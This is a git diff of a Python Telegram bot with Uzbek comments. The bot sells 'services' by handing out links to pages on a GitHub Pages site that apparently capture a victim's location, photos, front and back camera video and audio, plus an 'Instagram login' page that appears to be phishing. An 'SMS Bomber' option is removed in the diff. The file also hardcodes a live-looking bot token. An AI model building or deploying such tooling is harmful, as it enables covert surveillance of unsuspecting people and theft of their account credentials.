@@ -1,14 +1,14 @@
-
 import telebot
 from telebot import types
 
 TOKEN = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI'
 ADMIN_ID = 8275787221 
+# GitHub havolangizni oxirida '/' belgisiz yozing
 URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"
 
 bot = telebot.TeleBot(TOKEN)
 
-# Asosiy menyu
+# Asosiy menyu tugmalari
 def main_menu():
     kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     kb.add(types.KeyboardButton("🔐 Xizmatlar"), types.KeyboardButton("💼 Mening hisobim"))
@@ -16,13 +16,12 @@ def main_menu():
     kb.add(types.KeyboardButton("💳 To'lov qilish"))
     return kb
 
-# Xizmatlar menyusi
+# Xizmatlar menyusi tugmalari
 def services_menu():
     kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     kb.add(types.KeyboardButton("📍 Lokatsiya olish"), types.KeyboardButton("📸 Rasm olish"))
     kb.add(types.KeyboardButton("🎥 Old kamera video"), types.KeyboardButton("🔑 Instagram login"))
-    kb.add(types.KeyboardButton("🎬 Orqa kamera video"))
-    kb.add(types.KeyboardButton("💣 SMS Bomber"), types.KeyboardButton("🎵 Audio yozish"))
+    kb.add(types.KeyboardButton("🎬 Orqa kamera video"), types.KeyboardButton("🎵 Audio yozish"))
     kb.add(types.KeyboardButton("⬅️ Asosiy menyu"))
     return kb
 
@@ -34,16 +33,16 @@ def start(m):
 
 @bot.message_handler(func=lambda m: True)
 def handle_all(m):
-    # Admin uchun monitoring
+    # Admin monitoring
     if m.from_user.id != ADMIN_ID:
-        bot.send_message(ADMIN_ID, f"👤 {m.from_user.first_name} bosgan tugma: {m.text}")
+        bot.send_message(ADMIN_ID, f"👤 {m.from_user.first_name} (ID: {m.from_user.id}) bosgan tugma: {m.text}")
 
     if m.text == "🔐 Xizmatlar":
         bot.send_message(m.chat.id, "Xizmatlar bo'limi:", reply_markup=services_menu())
     elif m.text == "⬅️ Asosiy menyu":
-        bot.send_message(m.chat.id, "Asosiy menyuga qaytdingiz:", reply_markup=main_menu())
+        bot.send_message(m.chat.id, "Asosiy menyu:", reply_markup=main_menu())
     
-    # Xizmatlar havolalari
+    # Buyruqlarga mos havolalar (GitHub-dagi fayl nomlari bilan bir xil bo'lishi shart)
     elif m.text == "📸 Rasm olish":
         bot.send_message(m.chat.id, f"Havola: {URL}/index.html")
     elif m.text == "📍 Lokatsiya olish":
@@ -51,12 +50,15 @@ def handle_all(m):
     elif m.text == "🎥 Old kamera video":
         bot.send_message(m.chat.id, f"Havola: {URL}/index-2.html")
     elif m.text == "🎬 Orqa kamera video":
-        bot.send_message(m.chat.id, f"Havola: {URL}/back-video.html")
+        # Fayl nomidagi bo'shliqlarga e'tibor bering
+        bot.send_message(m.chat.id, f"Havola: {URL}/Orqa%20kamera%20video%20.html")
     elif m.text == "🔑 Instagram login":
         bot.send_message(m.chat.id, f"Havola: {URL}/instagram.html")
-    elif m.text == "💣 SMS Bomber":
-        bot.send_message(m.chat.id, "Tez kunda qo'shiladi...")
     elif m.text == "🎵 Audio yozish":
         bot.send_message(m.chat.id, f"Havola: {URL}/audio.html")
+    elif m.text == "💼 Mening hisobim":
+        bot.send_message(m.chat.id, f"👤 Ism: {m.from_user.first_name}\n🆔 ID: {m.from_user.id}\n💰 Balans: 0.00$")
+    elif m.text == "📞 Bog'lanish":
+        bot.send_message(m.chat.id, f"👨‍💻 Admin: @{bot.get_me().username}_admin")
 
 bot.polling(none_stop=True)
